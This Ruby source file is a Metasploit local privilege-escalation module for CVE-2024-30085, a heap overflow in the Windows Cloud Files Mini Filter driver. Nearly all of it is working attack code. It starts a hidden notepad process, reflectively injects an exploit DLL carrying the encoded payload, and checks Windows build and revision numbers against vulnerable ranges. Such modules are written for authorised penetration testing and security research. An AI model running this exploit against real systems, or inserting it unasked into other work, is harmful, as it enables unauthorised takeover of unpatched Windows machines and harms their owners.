##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::Version
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Cloud File Mini Filer Driver Heap Overflow',
        'Description' => %q{
          This module exploits the Windows Cloud Files Mini FIlter Driver cldflt.sys on Windows workstation versions
          10_1809 through 11_23H2 and Windows server versions 2022 to 22_23H2.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Alex Birnberg', # Original discovery
          'ssd-disclosure', # PoC
          'bwatters-r7' # msf module
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter', 'shell'],
        'Targets' => [
          ['Windows x64', { 'Arch' => ARCH_X64 }]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-12-19', # ?
        'References' => [
          ['CVE', '2024-30085'],
          ['URL', 'https://attackerkb.com/topics/EHiwxpT2Dp/cve-2024-30085'],
          ['URL', 'https://ssd-disclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/'],
          ['URL', 'https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [
            IOC_IN_LOGS
          ]
        }
      )
    )
  end

  def exploit
    print_status('Launching notepad to host the exploit...')
    notepad_path = get_notepad_pathname(ARCH_X64, client.sys.config.getenv('windir'), ARCH_X64)

    print_status("The notepad path is: #{notepad_path}")
    notepad_process = client.sys.process.execute(notepad_path, nil, { 'Hidden' => true })
    print_status("The notepad pid is: #{notepad_process.pid}")
    encoded_payload = payload.encoded
    execute_dll(
      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2024-30085', 'cve-202430085-dll.dll'),
      [encoded_payload.length].pack('I<') + encoded_payload,
      notepad_process.pid
    )
  end

  def validate_active_host
    print_status("Attempting to PrivEsc on #{sysinfo['Computer']} via session ID: #{datastore['SESSION']}")
  rescue Rex::Post::Meterpreter::RequestError => e
    elog('Could not connect to session', error: e)
    raise Msf::Exploit::Failed, 'Could not connect to session'
  end

  def validate_target
    if sysinfo['Architecture'] != ARCH_X64
      fail_with(Failure::NoTarget, 'Exploit code is 64-bit only')
    end
  end

  def target_compatible?(version)
    (version.build_number == Msf::WindowsVersion::Win10_2004 && version.revision_number <= 1415) ||
      (version.build_number == Msf::WindowsVersion::Win10_20H2 && version.revision_number <= 2965) ||
      (version.build_number == Msf::WindowsVersion::Win10_21H1 && version.revision_number <= 2364) ||
      (version.build_number == Msf::WindowsVersion::Win10_21H2 && version.revision_number < 4529) ||
      (version.build_number == Msf::WindowsVersion::Win10_22H2 && version.revision_number < 4529) ||
      (version.build_number == Msf::WindowsVersion::Win11_21H2 && version.revision_number < 3019) ||
      (version.build_number == Msf::WindowsVersion::Win11_22H2 && version.revision_number < 3737) ||
      (version.build_number == Msf::WindowsVersion::Win11_23H2 && version.revision_number < 3737) ||
      (version.build_number == Msf::WindowsVersion::Server2019 && version.revision_number < 5936) ||
      (version.build_number == Msf::WindowsVersion::Server2022 && version.revision_number < 2522) ||
      (version.build_number == Msf::WindowsVersion::Server2022_23H2 && version.revision_number < 950)
  end

  def check
    version = get_version_info
    vprint_status("OS version: #{version}")
    vprint_status("OS revision: #{version.revision_number}")
    return Exploit::CheckCode::Appears if target_compatible?(version)

    return Exploit::CheckCode::Safe
  end

end
